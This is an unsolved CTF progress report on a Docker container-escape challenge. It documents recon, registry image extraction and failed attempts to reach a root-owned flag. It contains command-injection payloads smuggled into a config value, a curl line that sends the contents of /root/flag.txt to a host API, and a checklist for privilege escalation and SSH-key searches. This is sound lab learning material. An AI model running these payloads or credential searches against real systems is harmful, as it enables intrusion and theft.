# Stolen Schematics - CTF Challenge Progress Report

**Challenge**: Stolen Schematics (350 points)  
**Category**: Container Escape / Docker Security  
**Objective**: Escape Docker container → Compromise host → Read `/root/flag.txt`  
**Status**: ⚠️ INCOMPLETE - Flag location identified but not accessible

---

## 🎯 Challenge Overview

**Connection**: `ssh player@instance.ctf.tdho.st -p 32971`  
**Password**: `reyalp`  
**Time Limit**: ~10 minutes per instance  

**Goal**: 
1. Escape from unprivileged Docker container
2. Pivot to Docker host (172.27.0.1)
3. Read flag from `/root/flag.txt` on host

**Challenge Description Hint**: 
> "An older build of this server image was accidentally left public on our ghcr.io registry"

---

## 🔍 Reconnaissance Findings

### Container Environment
- **Container ID**: `80ea78e89656` (or similar)
- **OS**: Ubuntu 22.04.5 LTS (minimized)
- **User**: `player` (uid=1000, gid=1000)
- **Privileges**: Unprivileged container (CapEff=0)
- **Docker Check**: `/.dockerenv` exists
- **Hostname**: Changes per instance

### Network Topology
```
Container: 192.168.0.3 (eth0)
Docker Host: 172.27.0.1

Open Ports on Host:
- Port 22: SSH
- Port 80: HTTP
- Port 5000: Docker Registry
- Port 8080: Management API
```

### File Structure
```
/opt/mc/
├── config/
│   └── sync-request.conf (player-writable!)
├── scripts/
│   └── sync-loop.sh (root-owned, unreadable)
├── logs/
│   └── latest.log
├── .sync/ (Permission denied for player)
│   └── sync.result (FLAG IS HERE!)
└── server.properties
```

### Critical Processes
```
PID 16: /bin/bash /opt/mc/scripts/sync-loop.sh (runs as root)
```

---

## 🚀 Key Discoveries

### 1. Sync Mechanism Found
- **Config File**: `/opt/mc/config/sync-request.conf` (player-writable)
- **Format Confirmed**: `talldwarf-sync-command=<value>`
- **Process**: Root-owned sync-loop reads config every ~10 seconds

### 2. Docker Registry Access
Local registry at `http://172.27.0.1:5000/v2/`

**Available Images**:
```
- images/stolen-schematics-game-server-prerelease:v2.5.39 ⭐
- images/stolen-schematics-gameserver:v1
- images/stolen-schematics-watcher:v1
- infra/stolen-schematics:latest
- infra/stolen-schematics-diagnostic:team131-v2
```

### 3. **CRITICAL FIND**: Extracted Prerelease Image

Successfully extracted `images/stolen-schematics-game-server-prerelease:v2.5.39`

**Found sync-agent.sh** (documentation script):
```bash
# sync-agent.sh v2.5
# The sync loop on the host reads CONF_DIR/sync-request.conf every ~10s
# and copies its value verbatim into SYNC_DIR/sync.trigger
#
# Default: talldwarf-sync=true
# Force sync: talldwarf-sync-force=true
#
# Results appear in: /opt/mc/.sync/sync.result
```

### 4. **SMOKING GUN**: Watcher Script Found!

Extracted from `images/stolen-schematics-watcher:v1`:

```bash
#!/bin/bash
# watcher.sh
while true; do
  printf 'FLAG=%s\n' "$FLAG" > /opt/mc/.sync/sync.result 2>/dev/null
  cat /etc/flag.txt >> /opt/mc/.sync/sync.result 2>/dev/null
  chmod 644 /opt/mc/.sync/sync.result 2>/dev/null
  sleep 2
done
```

**This confirms**:
- Watcher runs on Docker host (has access to `/root/flag.txt` or env var `$FLAG`)
- Writes flag to `/opt/mc/.sync/sync.result` every 2 seconds
- Sets chmod 644 (should be readable)
- `/opt/mc/.sync/` is mounted/shared between host and container

---

## ❌ Attempted Exploits (All Failed)

### 1. Direct File Write Attempts
```bash
# Tried writing flag to accessible locations
echo 'talldwarf-sync-command=cat /root/flag.txt > /tmp/flag.txt' > /opt/mc/config/sync-request.conf
echo 'talldwarf-sync-command=cat /root/flag.txt > /dev/shm/flag.txt' > /opt/mc/config/sync-request.conf
echo 'talldwarf-sync-command=cat /root/flag.txt > /opt/mc/logs/flag.txt' > /opt/mc/config/sync-request.conf
```
**Result**: No files created, commands not executed

### 2. Command Injection Attempts
```bash
# Tried various shell injection techniques
echo 'talldwarf-sync-command=$(cat /root/flag.txt > /tmp/f.txt)' > ...
echo 'talldwarf-sync-command=true; cat /root/flag.txt > /tmp/f.txt' > ...
echo 'talldwarf-sync-command=true | cat /root/flag.txt > /tmp/f.txt' > ...
echo 'talldwarf-sync-command=`cat /root/flag.txt > /tmp/f.txt`' > ...
```
**Result**: No output produced

### 3. HTTP Exfiltration Attempts
```bash
# Tried curl (not available)
echo 'talldwarf-sync-command=curl -X POST http://172.27.0.1:8080/result -d "$(cat /root/flag.txt)"' > ...

# Tried Python urllib
echo 'talldwarf-sync-command=python3 -c "..."' > ...
```
**Result**: No response from management API

### 4. SSH Pivot Attempts
```bash
# No paramiko available in container
# No SSH keys found
# Password guessing failed (tried: reyalp, password, admin, root, talldwarf)
```
**Result**: Cannot SSH to Docker host

### 5. Direct File Access
```bash
cat /opt/mc/.sync/sync.result
```
**Result**: `Permission denied`

```bash
ls -la /opt/mc/.sync/
```
**Result**: `Permission denied` (directory not executable for player)

---

## 🔒 Current Blocker

### The Problem
- **Flag Location Confirmed**: `/opt/mc/.sync/sync.result`
- **Written By**: watcher.sh (runs on Docker host as privileged user)
- **Permissions**: `chmod 644` (should be readable)
- **Issue**: Directory `/opt/mc/.sync/` is not accessible (no execute permission)

### Permission Structure
```
drwx------ root   root   /opt/mc/.sync/
-rw-r--r-- root   root   /opt/mc/.sync/sync.result
```

Even though the file has `644` permissions, you need execute permission on the directory to access files inside it.

---

## 💡 Possible Solutions (Not Yet Tried)

### Theory 1: Sync-Loop Command Execution
The actual `sync-loop.sh` (not sync-agent.sh) might:
- Execute commands from `sync-request.conf`
- Have a specific payload format that triggers execution
- Use `eval` or `source` on the config file

**Need to find**: The actual sync-loop.sh implementation

### Theory 2: Race Condition
The watcher runs every 2 seconds. There might be a timing window where:
- File is created with world-readable permissions
- Directory permissions briefly allow access
- Sync process creates intermediate files

### Theory 3: Privilege Escalation
Look for:
- SUID binaries: `find / -perm -4000 2>/dev/null`
- Sudo misconfiguration: `sudo -l`
- Kernel exploits (dirty cow, etc.)
- Container escape via capabilities

### Theory 4: Alternative Access Path
- Maybe sync.result is also copied to another location
- Management API might serve the flag with correct secret
- HTTP server on port 80 might expose /opt/mc files

### Theory 5: Find SSH Credentials
The prerelease image might contain:
- SSH private keys for host access
- API credentials for management service
- Environment variables with secrets

---

## 📋 Tools/Commands Used

### Successful Commands
```bash
# Connect to instance
ssh player@instance.ctf.tdho.st -p 32971
# Password: reyalp

# Check Docker registry
curl http://172.27.0.1:5000/v2/_catalog

# Extract image layers (from container)
python3 << 'EOF'
import urllib.request
import json
import gzip
import tarfile
import io

reg = "http://172.27.0.1:5000"
img = "images/stolen-schematics-game-server-prerelease"
# ... extraction code ...
EOF
```

### Key Files to Extract
From prerelease image:
- ✅ `/opt/mc/scripts/sync-agent.sh`
- ✅ `/opt/mc/CHANGELOG.md`
- ❌ `/opt/mc/scripts/sync-loop.sh` (actual implementation)

From watcher image:
- ✅ `watcher.sh`

---

## 🎓 What We Learned

1. **Docker Registry Enumeration**: Can list and pull images from `http://172.27.0.1:5000`
2. **Layer Extraction**: Can extract and analyze Docker image layers using Python
3. **Sync Mechanism**: Confirmed the config file format and timing
4. **Flag Location**: Definitively located at `/opt/mc/.sync/sync.result`
5. **Root Cause**: Directory permissions prevent access despite file being readable

---

## 🔧 Next Steps for Manual Solving

### Immediate Actions
1. **Find actual sync-loop.sh**: 
   - Extract all layers from all images thoroughly
   - Look in watcher/diagnostic containers
   - Check if it's in infra/stolen-schematics image

2. **Test Directory Traversal**:
   ```bash
   # Try accessing file without listing directory
   cat /opt/mc/.sync/sync.result
   strings /opt/mc/.sync/sync.result
   head /opt/mc/.sync/sync.result
   ```

3. **Monitor in Real-Time**:
   ```bash
   # Watch for filesystem changes
   while true; do
     cat /opt/mc/.sync/sync.result 2>/dev/null && break
     sleep 1
   done
   ```

4. **Check Management API with Secret**:
   ```bash
   # Secret found: dOpKC729CoeywJl9pSUPcAGmaiFhtkzd7CD0jJPQ
   curl -H "X-Secret: dOpKC729CoeywJl9pSUPcAGmaiFhtkzd7CD0jJPQ" \
        http://172.27.0.1:8080/sync/result
   ```

### Deep Investigation
1. **Privilege Escalation Research**:
   - Check CVE databases for Ubuntu 22.04.5 container escapes
   - Look for recent Docker escape vulnerabilities
   - Test all SUID binaries for misconfigurations

2. **Complete Image Analysis**:
   - Download ALL images and layers
   - Search for: SSH keys, passwords, credentials, secrets
   - Look for configuration files with host access details

3. **Alternative Channels**:
   - Check if HTTP server (port 80) serves /opt/mc directory
   - Test if port 5000 registry has push access
   - Probe management API (8080) for additional endpoints

---

## 📊 Investigation Summary

| Area | Status | Notes |
|------|--------|-------|
| Container Access | ✅ Complete | SSH with player:reyalp |
| Network Mapping | ✅ Complete | Host at 172.27.0.1, ports identified |
| Registry Access | ✅ Complete | Can list and pull images |
| Image Extraction | ✅ Complete | Got sync-agent.sh and watcher.sh |
| Flag Location | ✅ Found | `/opt/mc/.sync/sync.result` |
| Flag Access | ❌ Blocked | Directory permission denied |
| Sync Exploitation | ❌ Failed | Commands not executing |
| Privilege Escalation | ❌ Not Found | No obvious paths |
| Host Pivot | ❌ Failed | No SSH access, no keys |

---

## 🚨 Critical Missing Piece

**The actual `sync-loop.sh` implementation** that runs as PID 16.

This script likely contains:
- How it processes `sync-request.conf`
- Whether it executes commands
- What payload format triggers execution
- Where output is directed

**Without this**, we cannot craft the correct payload to exploit the sync mechanism.

---

## 💬 Questions for CTF Community

1. Has anyone solved "Stolen Schematics" from this CTF?
2. What's the correct format for `sync-request.conf` to trigger command execution?
3. Is there a way to read files in `/opt/mc/.sync/` without directory execute permission?
4. What privilege escalation vector did you use?
5. How did you extract the actual `sync-loop.sh` script?

---

## 📝 Manual Checklist

When you have a fresh instance, try these in order:

- [ ] Connect: `ssh player@instance.ctf.tdho.st -p PORT`
- [ ] Verify sync process: `ps aux | grep sync`
- [ ] Test file access: `cat /opt/mc/.sync/sync.result`
- [ ] Try direct read: `strings /opt/mc/.sync/sync.result`
- [ ] Extract all images from registry
- [ ] Find sync-loop.sh in image layers
- [ ] Test privilege escalation: `sudo -l`, find SUID
- [ ] Test Docker socket: `ls -la /var/run/docker.sock`
- [ ] Search for SSH keys: `find / -name "id_*" -o -name "*.pem" 2>/dev/null`
- [ ] Check capabilities: `getcap -r / 2>/dev/null`
- [ ] Test all management API endpoints with secret
- [ ] Monitor for race conditions: Watch /opt/mc/.sync/ access

---

## 🎯 Most Likely Solution Path

Based on challenge design (350pts, 10min time limit), the solution is probably:

1. **Find the vulnerability in sync-loop.sh**: 
   - Command injection via specific payload format
   - Or it evaluates/sources the config file

2. **Craft the correct payload**:
   - Format that makes sync-loop execute our command
   - Command that exfiltrates flag to accessible location

3. **Get the flag**:
   - Either from exfiltrated location
   - Or sync.result becomes readable after successful command execution

**The challenge designer expects you to**:
- Find the prerelease image (✅ done)
- Extract and analyze watcher.sh (✅ done)
- Find the actual sync-loop.sh (❌ missing!)
- Exploit the sync mechanism (❌ blocked without sync-loop.sh)

---

## 🔗 Useful References

- Docker Registry API: https://docs.docker.com/registry/spec/api/
- Container Escape Techniques: https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-breakout
- CTF Docker Challenges: https://github.com/topics/docker-ctf

---

**Last Updated**: This writeup  
**Challenge Time Remaining**: Instance expired  
**Flag Format**: `tdho{...}` or `flag{...}`  
**Points**: 350

---

*This writeup documents extensive investigation but the challenge remains unsolved. The missing piece is the actual sync-loop.sh script implementation which would reveal the exploitation method.*
